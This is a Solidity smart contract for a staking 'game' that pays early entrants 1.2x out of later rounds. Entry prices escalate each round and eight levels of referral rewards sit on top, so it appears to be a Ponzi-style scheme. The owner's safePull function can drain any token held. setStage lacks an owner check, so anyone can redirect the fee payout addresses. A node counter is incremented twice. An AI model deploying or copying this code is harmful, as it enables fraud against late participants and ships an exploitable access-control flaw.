// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Ck_Game is OwnableUpgradeable {
    IERC20 public CK;
    IERC20 public U;

    struct Position {
        address root;
        uint round;
        uint totalCk;
        bool isOut;
    }

    struct RoundInfo {
        uint startTime;
        uint endTime;
        address[] newUserList;
        uint newUserAmount;
        uint totalCk;
        bool claimAble;
    }

    struct UserInfo {
        uint position;
        uint level;
        mapping(uint => uint) roundAmount;
        mapping(uint => bool) roundStake;
        mapping(uint => bool) claimRound;
        mapping(uint => uint) roundFomo;
        address[] referList;
        bool fomoClaimed;
        uint ownerOfNode;
        bool isMarketNode;
        uint claimed;
        uint debt;
        uint initDebt;
        uint nodeClaimed;
        uint totalStake;
        uint newUserReward;
    }

    struct ReferReward {
        uint dynamicClaimed;
        uint levelReward;
        uint directReward;
        uint sameLevelReward;
        uint eightReward;
    }

    struct StageInfo {
        address stage1;
        address stage2;
        address stage3;
    }

    struct ReferInfo {
        address invitor;
        bool isRefer;
        uint referAmount;

    }

    StageInfo public stage;
    mapping(address => ReferReward) referReward;
    mapping(address => ReferInfo) public referInfo;
    mapping(uint => Position) public position;
    mapping(uint => mapping(uint => RoundInfo)) public roundInfo;
    mapping(address => UserInfo) public userInfo;
    uint public initNodePrice;
    uint public marketNodePrice;
    uint public positionAmount;
    uint[] fomoRate;

    struct NodeInfo {
        uint initNodeAmount;
        uint marketNodeAmount;
        uint debt;
    }

    NodeInfo public nodeInfo;
    uint[] referLimit;
    uint[] referRewardRate;
    uint fastTime;
    address public feeWallet;

    function initialize() public initializer {
        __Ownable_init();
        initNodePrice = 5000 ether;
        marketNodePrice = 1000 ether;
        referLimit = [0, 50 ether, 500 ether, 1000 ether];
        referRewardRate = [0, 2, 4, 6];
        fomoRate = [50, 30, 20, 11, 9, 8, 7, 6, 5, 4];
        fastTime = 86400;
        stage.stage1 = 0x1b5Ed2DB196E1d09B292d9D80dA9F50c2021e0e7;
        stage.stage2 = 0x10318b6f97349088463D29b63B5B42b196c9bd41;
        stage.stage3 = 0xA13Ba2B0bA373618efe5d802C0a3d910147aE205;
        feeWallet = 0x022D16F13CC8353Bad5b1bE1de64b7c0C01ee3e6;

    }

    modifier onlyEOA(){
        require(msg.sender == tx.origin, 'only eoa');
        _;
    }

    modifier checkRoundUpgrade(uint positionId){
        Position storage pos = position[positionId];
        RoundInfo storage round = roundInfo[positionId][pos.round];
        uint userLimit = getRoundUserLimit(positionId);
        if (round.newUserList.length >= userLimit) {
            upGradeRound(positionId);
        }
        if (round.newUserList.length < userLimit && block.timestamp >= round.endTime) {
            pos.isOut = true;
        }
        _;
        if (round.newUserList.length >= userLimit) {
            upGradeRound(positionId);

        }
    }

    function setCk(address addr) external onlyOwner {
        CK = IERC20(addr);
    }

    function setU(address addr) external onlyOwner {
        U = IERC20(addr);
    }

    function setUserLevel(address addr, uint level) external onlyOwner {
        userInfo[addr].level = level;
    }

    function setUserLevelBatch(address[] memory addrs, uint[] memory level) external onlyOwner {
        for (uint i = 0; i < addrs.length; i++) {
            userInfo[addrs[i]].level = level[i];
        }
    }

    function setFastTime(uint times) external onlyOwner {
        fastTime = times;
    }

    function _newRound(address owner_) internal {
        require(userInfo[owner_].ownerOfNode == 0, 'have initNode');
        require(userInfo[owner_].position == 0, 'bond position');
        positionAmount++;
        uint id = positionAmount;
        position[id].root = owner_;
        position[id].round = 1;
        RoundInfo storage round = roundInfo[id][1];
        round.startTime = block.timestamp;
        round.endTime = block.timestamp + 2 days;
        referInfo[owner_].isRefer = true;
        userInfo[owner_].position = id;
        userInfo[owner_].ownerOfNode = positionAmount;
        nodeInfo.initNodeAmount ++;
    }

    function newRound(uint id, address owner_) public onlyOwner {
        require(position[id].round == 0 && id == positionAmount + 1, 'have id');
        _newRound(owner_);
    }

    function setStage(address stage1_, address stage2_, address stage3_) external onlyEOA {
        stage.stage1 = stage1_;
        stage.stage2 = stage2_;
        stage.stage3 = stage3_;
    }

    function bond(address invitor) external onlyEOA {
        UserInfo storage user = userInfo[msg.sender];
        ReferInfo storage refer = referInfo[msg.sender];
        require(referInfo[invitor].isRefer, 'wrong invitor');
        require(refer.invitor == address(0), 'bonded');
        uint positionId = userInfo[invitor].position;
        user.position = positionId;
        refer.invitor = invitor;
        userInfo[invitor].referList.push(msg.sender);

    }

    function checkIsRefer(address addr) public view returns (bool){
        if (referInfo[addr].isRefer) {
            return true;
        } else {
            return false;
        }

    }

    function enter(uint positionId) external onlyEOA checkRoundUpgrade(positionId) {

        UserInfo storage user = userInfo[msg.sender];
        Position storage pos = position[positionId];
        RoundInfo storage round = roundInfo[positionId][pos.round];
        ReferInfo storage refer = referInfo[msg.sender];
        require(round.newUserList.length < getRoundUserLimit(positionId), 'full stake');
        require(user.position == positionId, 'wrong position id');
        require(!user.roundStake[pos.round], 'this round staked');
        require(!pos.isOut, 'round is out');
        require(block.timestamp >= round.startTime, 'not start');
        require(block.timestamp < round.endTime, 'end');
        uint ckAmount = getUserInAmount(positionId);
        CK.transferFrom(msg.sender, address(this), ckAmount);
        user.totalStake += ckAmount;
        user.roundAmount[pos.round] = ckAmount;
        pos.totalCk += ckAmount;
        round.totalCk += ckAmount;
        bool isNew;
        if (!refer.isRefer) {
            refer.isRefer = true;
            isNew = true;
        }
        uint allNode = nodeInfo.initNodeAmount + nodeInfo.marketNodeAmount;
        nodeInfo.debt += ckAmount / 100 / allNode;
        user.roundStake[pos.round] = true;
        round.newUserList.push(msg.sender);
        round.newUserAmount++;
        if (msg.sender != pos.root) {
            _processReferAmount(msg.sender, ckAmount, isNew);
        }

    }

    function buyInitNode() external onlyEOA {
        require(userInfo[msg.sender].ownerOfNode == 0, 'already have node');
        require(userInfo[msg.sender].position == 0, 'have position');
        U.transferFrom(msg.sender, address(this), initNodePrice);
        _newRound(msg.sender);
        userInfo[msg.sender].ownerOfNode = positionAmount;
        nodeInfo.initNodeAmount ++;
    }

    function newMarketNode(address addr) external onlyOwner {
        require(!userInfo[addr].isMarketNode && userInfo[addr].ownerOfNode == 0, 'already have node');
        require(userInfo[addr].position != 0, 'must bond 1 position');
        userInfo[addr].isMarketNode = true;
        nodeInfo.marketNodeAmount ++;
    }

    function cancelMarketNode(address addr) external onlyOwner{
        require(userInfo[addr].isMarketNode,'not market node');
        userInfo[addr].isMarketNode = false;
        nodeInfo.marketNodeAmount --;
    }

    function checkNodeReward(address addr) public view returns (uint rew){
        rew = 0;
        if (userInfo[addr].ownerOfNode != 0 || userInfo[addr].isMarketNode) {
            rew = userInfo[addr].newUserReward;
        }

    }

    function checkNodeShare(address addr) public view returns (uint rew){
        uint temp;
        if (userInfo[addr].ownerOfNode != 0) {
            temp ++;
        }
        if (userInfo[addr].isMarketNode) {
            temp ++;
        }
        if (temp == 0) {
            rew = 0;
        } else {
            rew = (nodeInfo.debt - userInfo[addr].debt) * temp;
        }
    }

    function claimReferReward() external onlyEOA {
        ReferReward storage user = referReward[msg.sender];
        uint rew;
        {
            uint sameLevel = user.sameLevelReward;
            uint levelRew = user.levelReward;
            uint eightRew = user.eightReward;
            uint dirRew = user.directReward;
            rew += sameLevel + levelRew + eightRew + dirRew;
        }

        require(rew > 0, 'no reward');
        user.sameLevelReward = 0;
        user.levelReward = 0;
        user.eightReward = 0;
        user.directReward = 0;
        user.dynamicClaimed += rew;
        CK.transfer(msg.sender, rew);
    }

    function claimNodeShare() external onlyEOA {
        uint rew = checkNodeShare(msg.sender);
        require(rew > 0, 'no share reward');
        CK.transfer(msg.sender, rew);
        userInfo[msg.sender].debt = nodeInfo.debt;
        userInfo[msg.sender].nodeClaimed += rew;
    }


    function claimNodeReward() external onlyEOA {
        uint rew = checkNodeReward(msg.sender);
        require(rew > 0, 'no node reward');
        CK.transfer(msg.sender, rew);
        userInfo[msg.sender].newUserReward = 0;
    }

    function calculateRelease(address addr) public view returns (uint){
        UserInfo storage user = userInfo[addr];
        uint nowRound = position[user.position].round;
        uint rew = 0;
        if (nowRound > 3) {
            for (uint i = 1; i <= nowRound - 3; i++) {
                if (user.roundStake[i] && !user.claimRound[i]) {
                    rew += user.roundAmount[i] * 12 / 10;
                }
            }
        }
        return rew;
    }

    function calculateFailRelease(address addr) public view returns (uint){
        uint start = 1;
        UserInfo storage user = userInfo[addr];
        uint positionId = user.position;
        uint nowRound = position[positionId].round;
        if (!checkPositionIsOut(positionId)) {
            return 0;
        }
        if (nowRound > 3) {
            start = nowRound - 3;
        }
        uint rew = 0;
        for (uint i = start; i <= nowRound; i++) {
            uint totalUser = roundInfo[positionId][i].newUserList.length;
            if (user.roundStake[i] && !user.claimRound[i] && totalUser > 0) {
                rew += roundInfo[positionId][i].totalCk / 10 / totalUser;
            }
        }
        return rew;
    }

    function calculateFomo(address addr) public view returns (uint){
        uint start = 1;
        UserInfo storage user = userInfo[addr];
        if (user.fomoClaimed) {
            return 0;
        }
        uint positionId = user.position;
        uint nowRound = position[positionId].round;
        uint rew;
        if (nowRound > 3) {
            start = nowRound - 3;
        }
        for (uint i = start; i <= nowRound; i++) {
            rew += user.roundFomo[i];
        }

        return rew;
    }

    function claimRelease() external onlyEOA {
        UserInfo storage user = userInfo[msg.sender];
        uint nowRound = position[user.position].round;
        uint rew = 0;
        if (nowRound > 3) {
            for (uint i = 1; i <= nowRound - 3; i++) {
                if (user.roundStake[i] && !user.claimRound[i]) {
                    rew += user.roundAmount[i] * 12 / 10;
                    user.claimRound[i] = true;
                }
            }
        }
        uint fee = rew * 3 / 100;
        rew -= fee;
        CK.transfer(feeWallet, fee);
        CK.transfer(msg.sender, rew);
    }

    function claimFailRelease() external onlyEOA {

        uint start = 1;
        UserInfo storage user = userInfo[msg.sender];
        uint positionId = user.position;
        require(checkPositionIsOut(positionId), 'not out yet');
        if (!position[positionId].isOut) {
            _processOut(positionId);
        }
        uint nowRound = position[positionId].round;
        if (nowRound > 3) {
            start = nowRound - 3;
        }
        uint rew = 0;
        for (uint i = start; i <= nowRound; i++) {
            uint totalUser = roundInfo[positionId][i].newUserList.length;
            if (user.roundStake[i] && !user.claimRound[i] && totalUser > 0) {
                rew += roundInfo[positionId][i].totalCk / 10 / totalUser;
                user.claimRound[i] = true;
            }
        }
        uint fee = rew * 3 / 100;
        rew -= fee;
        CK.transfer(feeWallet, fee);
        CK.transfer(msg.sender, rew);
    }

    function claimFomo() external onlyEOA {
        uint start = 1;
        UserInfo storage user = userInfo[msg.sender];
        require(!user.fomoClaimed, 'claimed');
        uint positionId = user.position;
        require(checkPositionIsOut(positionId), 'not out yet');
        uint nowRound = position[positionId].round;
        uint rew;
        if (nowRound > 3) {
            start = nowRound - 3;
        }
        for (uint i = start; i <= nowRound; i++) {
            rew += user.roundFomo[i];
        }
        require(rew > 0, 'no reward');
        user.fomoClaimed = true;
        CK.transfer(msg.sender, rew);
    }

    function getUserToClaimRound(address addr) public view returns (uint[] memory){
        uint index = 0;
        UserInfo storage user = userInfo[addr];
        uint nowRound = position[user.position].round;
        uint[] memory lists;
        if (nowRound > 3) {
            for (uint i = 1; i <= nowRound; i++) {
                if (user.roundStake[i] && !user.claimRound[i]) {
                    index++;
                }
            }
            lists = new uint[](index);

            for (uint i = 1; i <= nowRound; i++) {
                if (user.roundStake[i] && !user.claimRound[i]) {
                    index--;
                    lists[index] = i;
                }
            }
        } else {
            lists = new uint[](0);
        }
        return lists;
    }

    function checkPositionIsOut(uint positionId) public view returns (bool){
        if (position[positionId].isOut) {
            return true;
        }
        RoundInfo storage round = roundInfo[positionId][position[positionId].round];
        uint userLimit = getRoundUserLimit(positionId);
        bool out = false;
        if (round.newUserList.length < userLimit && block.timestamp >= round.endTime) {
            out = true;
        }
        return out;
    }


    function _processOut(uint positionId) internal {
        position[positionId].isOut = true;
        {
            uint start = 1;
            uint nowRound = position[positionId].round;
            if (nowRound > 3) {
                start = nowRound - 3;
            }
            for (uint i = start; i <= nowRound; i++) {
                RoundInfo storage round = roundInfo[positionId][i];
                uint rewards = round.totalCk;
                address[] memory lists = round.newUserList;
                uint index = lists.length;
                if (index == 0) {
                    continue;
                }
                uint length = 10;
                if (index < length) {
                    length = index;
                }
                index--;
                for (uint j = 0; j < length; j++) {
                    uint rew = rewards * fomoRate[j] / 1000;
                    userInfo[lists[index - j]].roundFomo[i] = rew;
                }
            }
        }
    }


    function getUserInAmount(uint positionId) public view returns (uint){
        uint out = 1 ether;
        if (position[positionId].round == 1) {
            return out;
        } else {
            for (uint i = 1; i < position[positionId].round; i++) {
                out = out * 15 / 10;
            }
            return out;
        }
    }

    function getRoundUserLimit(uint positionId) public view returns (uint){
        uint out = 100;
//        if (out == 100) {
//            return 10;
//        }
        if (position[positionId].round == 1) {
            return out;
        } else {
            for (uint i = 1; i < position[positionId].round; i++) {
                out = out * 15 / 10;
            }
            return out;
        }
    }

    function getUserLevel(address addr) public view returns (uint){
        uint amount = referInfo[addr].referAmount;
        uint out = 0;
        if (userInfo[addr].level != 0) {
            return userInfo[addr].level;
        }
        for (uint i = 0; i < referLimit.length; i++) {
            if (amount < referLimit[i]) {
                break;
            }
            if (amount >= referLimit[i]) {
                out = i;
            }
        }
        return out;
    }

    function _processReferAmount(address addr, uint amount, bool isNew) internal {
        uint sameLevelLeft = 10;
        {
            address invitor = referInfo[addr].invitor;
            uint lastLevel = getUserLevel(addr);
            //            address root = position[userInfo[addr].position].root;
            address temp = invitor;
            referReward[temp].directReward += amount * 7 / 100;
            //first referRew
            uint lever = 1;


            while (true) {
                if (temp == address(0)) {
                    break;
                }
                ReferInfo storage user = referInfo[temp];
                ReferReward storage refer = referReward[temp];
                user.referAmount += amount;
                uint tempLevel = getUserLevel(temp);
                if (lever <= 8) {
                    refer.eightReward += amount / 100;
                    lever++;
                }
                if (tempLevel > lastLevel) {
                    refer.levelReward += amount * referRewardRate[tempLevel] / 100;
                    lastLevel = tempLevel;
                } else if (tempLevel == lastLevel && sameLevelLeft > 0 && lastLevel != 0) {
                    sameLevelLeft --;
                    refer.sameLevelReward += amount / 100;
                }
                if (isNew) {
                    if (userInfo[temp].isMarketNode) {
                        userInfo[temp].newUserReward += amount * 3 / 100;
                    }
                    if (userInfo[temp].ownerOfNode != 0) {
                        userInfo[temp].newUserReward += amount * 2 / 100;
                    }
                }

                temp = referInfo[temp].invitor;
            }
        }
        if (sameLevelLeft > 0) {
            CK.transfer(stage.stage3, amount * sameLevelLeft / 100);
        }
    }

    function upGradeRound(uint positionId) internal {
        Position storage pos = position[positionId];
        pos.round++;
        RoundInfo storage _newRounds = roundInfo[positionId][pos.round];
        uint lastStartTime = roundInfo[positionId][pos.round - 1].startTime;
        uint startTime;
        if (block.timestamp < lastStartTime + fastTime) {
            startTime = lastStartTime + fastTime;
        } else {
            startTime = block.timestamp;
        }
        _newRounds.startTime = startTime;
        _newRounds.endTime = checkRoundEndTime(startTime, pos.round);
        if (pos.round >= 4) {
            if (!roundInfo[positionId][pos.round - 3].claimAble) {
                roundInfo[positionId][pos.round - 3].claimAble = true;
                CK.transfer(stage.stage2, roundInfo[positionId][pos.round - 3].totalCk * 15 / 100);
                CK.transfer(stage.stage1, roundInfo[positionId][pos.round - 3].totalCk * 10 / 100);
            }
        }
    }

    function checkRoundEndTime(uint startTime, uint round) internal view returns (uint){
        uint out = startTime + (fastTime * 2 * 3 ** (round - 1));
        return out;
    }

    function checkPositionInfo(address addr) public view returns (uint positionId, uint round,
        uint totalAmount,
        uint startTime,
        uint endTime,
        uint userLimit,
        uint userAmount,
        bool isOut,
        bool isStake){
        positionId = userInfo[addr].position;
        Position storage pos = position[positionId];
        RoundInfo storage rounds = roundInfo[positionId][pos.round];
        round = pos.round;
        totalAmount = rounds.totalCk;
        startTime = rounds.startTime;
        endTime = rounds.endTime;
        userLimit = getRoundUserLimit(positionId);
        userAmount = rounds.newUserList.length;
        isOut = checkPositionIsOut(positionId);
        isStake = userInfo[addr].roundStake[round];
    }

    function checkReferListInfo(address addr) public view returns (address[] memory userList, uint[] memory userTotal, uint[] memory referAmount, uint[] memory level){
        userList = userInfo[addr].referList;
        userTotal = new uint[](userList.length);
        referAmount = new uint[](userList.length);
        level = new uint[](userList.length);
        for (uint i = 0; i < userList.length; i++) {
            userTotal[i] = userInfo[userList[i]].totalStake;
            referAmount[i] = referInfo[userList[i]].referAmount;
            level[i] = getUserLevel(userList[i]);
        }
    }

    function checkNodeInfo(address addr) public view returns (bool isInitNode, bool isMarketNode, uint nodeClaimed, uint nodeShare, uint nodeNewReward){
        isInitNode = userInfo[addr].ownerOfNode > 0;
        isMarketNode = userInfo[addr].isMarketNode;
        nodeClaimed = userInfo[addr].nodeClaimed;
        nodeShare = checkNodeShare(addr);
        nodeNewReward = checkNodeReward(addr);
    }

    function checkReferInfo(address addr) public view returns (uint level,
        uint referAmount,
        uint totalClaimed,
        uint directReward,
        uint eightReward,
        uint levelReward,
        uint sameLevelReward,
        address invitor){
        ReferInfo storage refer = referInfo[addr];
        ReferReward storage reward = referReward[addr];
        level = getUserLevel(addr);
        referAmount = refer.referAmount;
        totalClaimed = reward.dynamicClaimed;
        directReward = reward.directReward;
        eightReward = reward.eightReward;
        levelReward = reward.levelReward;
        sameLevelReward = reward.sameLevelReward;
        invitor = referInfo[addr].invitor;
    }

    function checkPositionRoundInfo(address addr, uint round) public view returns (
        uint totalAmount,
        uint startTime,
        uint endTime,
        uint userLimit,
        uint userAmount,
        bool isStake){
        uint positionId = userInfo[addr].position;
        Position storage pos = position[positionId];
        RoundInfo storage rounds = roundInfo[positionId][round];
        round = pos.round;
        totalAmount = rounds.totalCk;
        startTime = rounds.startTime;
        endTime = rounds.endTime;
        userLimit = getRoundUserLimit(positionId);
        userAmount = rounds.newUserList.length;
        isStake = userInfo[addr].roundStake[round];
    }

    function safePull(address token,address wallet_,uint amount) external onlyOwner{
        IERC20(token).transfer(wallet_,amount);
    }


}